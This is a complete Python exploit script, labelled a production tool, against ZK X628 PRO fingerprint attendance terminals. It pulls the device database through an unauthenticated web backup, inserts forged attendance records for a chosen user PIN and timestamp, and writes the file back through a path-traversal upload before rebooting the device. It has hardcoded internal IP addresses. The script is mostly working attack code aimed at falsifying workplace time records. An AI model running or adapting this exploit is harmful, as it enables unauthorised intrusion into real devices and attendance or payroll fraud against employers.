#!/usr/bin/env python3
"""
ZK REMOTE ATTLOG WRITER - PRODUCTION TOOL
========================================
Exploits CVE-2023-3941 (UPLOAD_PICTURE path traversal) on ZK X628 PRO FW 6.60.

Attack chain:
1. Download current ZKDB.db from web backup (CVE-2023-4587)
2. Inject desired ATTLOG records via SQLite INSERT
3. Upload modified ZKDB.db via UPLOAD_PICTURE 0x272B with path traversal (CVE-2023-3941)
4. Reboot device
5. New ATTLOG records now on device!

Requirements:
- Network access to ZK device on port 4370
- Web backup available at web UI (port 80) for clean ZKDB.db
- OR use existing ZKDB.db from another source

Trade-offs:
- Replaces entire ZKDB.db (loses records added since last web backup)
- ~3-4 minutes per record batch (upload is slow due to 32KB chunks)
- Device temporarily unavailable during reboot

Author: Mavis (BS-licensed security research)
Date: 2026-09-16
"""
import sys
sys.path.insert(0, 'D:\\chamcong\\AttendanceSuite_Portable\\python\\Lib\\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

import argparse, socket, struct, time, sqlite3, os, shutil, tempfile
from datetime import datetime
from zk import ZK, const
from struct import pack, unpack

DEFAULT_DEVICE_IP = '172.16.0.214'
DEFAULT_WEB_IP = '172.16.254.202'

def send_cmd(conn, command, data=b''):
    try:
        return conn._ZK__send_command(command, data, response_size=1024)
    except Exception as e:
        return {'status': False, 'error': str(e)}

def upload_zkdb_via_picture(conn, zkdb_data, chunk_size=32768):
    """Upload ZKDB.db via UPLOAD_PICTURE 0x272B + path traversal (CVE-2023-3941)."""
    traversal = ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + "mnt/mtdblock/data/ZKDB.db"
    filename = traversal.encode() + b'\x00'
    size = len(zkdb_data)

    print('  [1/3] PREPARE_DATA size={}'.format(size))
    r1 = send_cmd(conn, const.CMD_PREPARE_DATA, pack('I', size))
    if not r1.get('status'):
        return {'error': 'PREPARE_DATA failed', 'r1': r1}

    print('  [2/3] Sending {} chunks of {} bytes...'.format(size // chunk_size, chunk_size))
    remain = size % chunk_size
    packets = (size - remain) // chunk_size
    failed = []
    t0 = time.time()
    for i in range(packets):
        r = send_cmd(conn, const.CMD_DATA, zkdb_data[i*chunk_size:(i+1)*chunk_size])
        if not r.get('status'):
            failed.append(i)
            if len(failed) > 5:
                return {'error': 'Too many failures', 'last': r, 'failed': failed}
        if (i+1) % 50 == 0:
            elapsed = time.time() - t0
            speed = (i+1) * chunk_size / elapsed / 1024
            print('    ...{}/{} chunks ({:.1f} KB/s)'.format(i+1, packets, speed))
    if remain:
        r = send_cmd(conn, const.CMD_DATA, zkdb_data[packets*chunk_size:])
    elapsed = time.time() - t0
    print('  Upload time: {:.1f}s ({:.1f} KB/s)'.format(elapsed, size/elapsed/1024))

    print('  [3/3] UPLOAD_PICTURE commit...')
    r3 = send_cmd(conn, 0x272B, filename)
    return {'PREPARE': r1, 'UPLOAD': r3, 'failed_chunks': failed, 'time': elapsed}

def download_zkdb_from_web(web_ip, output_path, timeout_s=60):
    """Download ZKDB.db from ZK web UI (CVE-2023-4587 - unauthenticated)."""
    import urllib.request, gzip, tarfile
    url = 'http://{}/form/DataApp?style=0'.format(web_ip)
    print('  Downloading {}...'.format(url))
    req = urllib.request.Request(url)
    with urllib.request.urlopen(req, timeout=timeout_s) as resp:
        data = resp.read()
    print('  Got {} bytes'.format(len(data)))
    # Find GZIP magic
    gz_magic = b'\x1f\x8b\x08'
    gz_offset = data.find(gz_magic)
    if gz_offset < 0:
        raise RuntimeError('No GZIP magic found')
    print('  GZIP at offset {}'.format(gz_offset))
    gz_data = gzip.decompress(data[gz_offset:])
    print('  Decompressed: {} bytes'.format(len(gz_data)))
    # Find TAR
    tar_magic = b'ustar'  # TAR magic at offset 257
    if tar_magic not in gz_data[:300]:
        raise RuntimeError('No TAR header found')
    # Skip TAR header (512 bytes) to get SQLite
    sqlite_magic = b'SQLite format 3'
    sqlite_offset = gz_data.find(sqlite_magic)
    if sqlite_offset < 0:
        raise RuntimeError('No SQLite found in TAR')
    # Read file size from TAR header at offset 124-136 (octal)
    tar_header = gz_data[:512]
    size_str = tar_header[124:136].decode('ascii', errors='replace').strip('\x00')
    file_size = int(size_str, 8)
    print('  TAR file size: {} bytes'.format(file_size))
    sqlite_data = gz_data[sqlite_offset:sqlite_offset + file_size]
    with open(output_path, 'wb') as f:
        f.write(sqlite_data)
    print('  Saved: {}'.format(output_path))
    return sqlite_data

def inject_attlog_records(db_path, records):
    """Inject ATTLOG records into SQLite DB."""
    db = sqlite3.connect(db_path)
    cur = db.cursor()
    before_count = cur.execute('SELECT COUNT(*) FROM ATT_LOG').fetchone()[0]
    for r in records:
        cur.execute('''INSERT INTO ATT_LOG (User_PIN, Verify_Type, Verify_Time, Status, Work_Code_ID, Sensor_NO, Att_Flag, CREATE_ID, MODIFY_TIME, SEND_FLAG)
                      VALUES (?, ?, ?, ?, ?, ?, ?, NULL, NULL, 0)''',
                    (str(r['pin']), r.get('verify_mode', 1), r['timestamp'],
                     r.get('status', 0), r.get('work_code', 0), 0, 0))
    after_count = cur.execute('SELECT COUNT(*) FROM ATT_LOG').fetchone()[0]
    db.commit()
    db.close()
    return before_count, after_count

def main():
    parser = argparse.ArgumentParser(description='ZK Remote ATTLOG Writer (CVE-2023-3941)')
    parser.add_argument('--device-ip', default=DEFAULT_DEVICE_IP, help='ZK device IP (port 4370)')
    parser.add_argument('--web-ip', default=DEFAULT_WEB_IP, help='ZK web UI IP for ZKDB.db source')
    parser.add_argument('--pin', default='1', help='User PIN to inject')
    parser.add_argument('--timestamp', help='ISO timestamp (default: now)')
    parser.add_argument('--verify-mode', type=int, default=1, help='1=fingerprint, 15=card, etc.')
    parser.add_argument('--count', type=int, default=1, help='Number of records to inject')
    parser.add_argument('--source-db', help='Use existing ZKDB.db file (skip web download)')
    parser.add_argument('--no-reboot', action='store_true', help='Skip reboot (for testing)')
    parser.add_argument('--dry-run', action='store_true', help='Only inject, do not upload')
    args = parser.parse_args()

    print('=' * 70)
    print('ZK REMOTE ATTLOG WRITER (CVE-2023-3941)')
    print('=' * 70)
    print('Target: {}'.format(args.device_ip))
    print('Web source: {}'.format(args.web_ip if not args.source_db else args.source_db))

    # Step 1: Get ZKDB.db
    work_dir = 'D:\\chamcong\\zk_inject_workspace'
    os.makedirs(work_dir, exist_ok=True)

    if args.source_db:
        db_path = args.source_db
        print('\n[*] Step 1: Using existing ZKDB.db: {}'.format(db_path))
    else:
        db_path = os.path.join(work_dir, 'current_zkdb.db')
        print('\n[*] Step 1: Downloading ZKDB.db from web UI...')
        try:
            download_zkdb_from_web(args.web_ip, db_path)
        except Exception as e:
            print('[!] Web download failed: {}'.format(e))
            return

    # Verify SQLite
    try:
        db = sqlite3.connect(db_path)
        cur = db.cursor()
        orig = cur.execute('SELECT COUNT(*) FROM ATT_LOG').fetchone()[0]
        db.close()
        print('  [+] Original ATTLOG count: {}'.format(orig))
    except Exception as e:
        print('[!] SQLite error: {}'.format(e))
        return

    # Step 2: Inject records
    print('\n[*] Step 2: Injecting ATTLOG records...')
    records = []
    if args.timestamp:
        ts = args.timestamp
    else:
        ts = datetime.now().strftime('%Y-%m-%dT%H:%M:%S')

    for i in range(args.count):
        records.append({
            'pin': args.pin,
            'timestamp': ts,
            'verify_mode': args.verify_mode,
            'status': 0,
            'work_code': 0
        })

    before, after = inject_attlog_records(db_path, records)
    print('  [+] ATTLOG: {} -> {}'.format(before, after))

    if args.dry_run:
        print('\n[DRY RUN] Skipping upload')
        return

    # Read modified
    with open(db_path, 'rb') as f:
        modified = f.read()
    print('  [*] Modified DB size: {} bytes'.format(len(modified)))

    # Step 3: Connect and upload
    print('\n[*] Step 3: Connecting to {}...'.format(args.device_ip))
    zk = ZK(args.device_ip, port=4370, timeout=60, password=0)
    conn = zk.connect()
    print('  [+] Connected:', conn.get_firmware_version())

    try:
        before_att = len(conn.get_attendance())
        print('  [*] Before ATTLOG: {}'.format(before_att))
    except: before_att = None

    try: conn.disable_device()
    except: pass

    print('\n[*] Step 4: Uploading ZKDB.db via CVE-2023-3941...')
    result = upload_zkdb_via_picture(conn, modified)
    print('  Result:', result)

    if args.no_reboot:
        print('\n[*] Skipping reboot (--no-reboot)')
    else:
        print('\n[*] Step 5: Rebooting device...')
        try: conn.restart()
        except: pass

        try: conn.enable_device()
        except: pass
        try: conn.disconnect()
        except: pass

        print('\n[*] Waiting 25s for reboot...')
        time.sleep(25)

        print('\n[*] Step 6: Reconnecting + verifying...')
        try:
            zk2 = ZK(args.device_ip, port=4370, timeout=30, password=0)
            conn2 = zk2.connect()
            try:
                after_att = len(conn2.get_attendance())
                print('  [+] After ATTLOG: {}'.format(after_att))
                if before_att is not None:
                    delta = after_att - before_att
                    print('  Delta: {:+d}'.format(delta))
                    if delta >= len(records):
                        print('\n  *** ATTLOG INJECTION SUCCESS ***')
            except Exception as e:
                print('  ATTLOG check err:', e)
            conn2.disconnect()
        except Exception as e:
            print('  Reconnect err:', e)

    print('\n[+] Done')

if __name__ == '__main__':
    main()
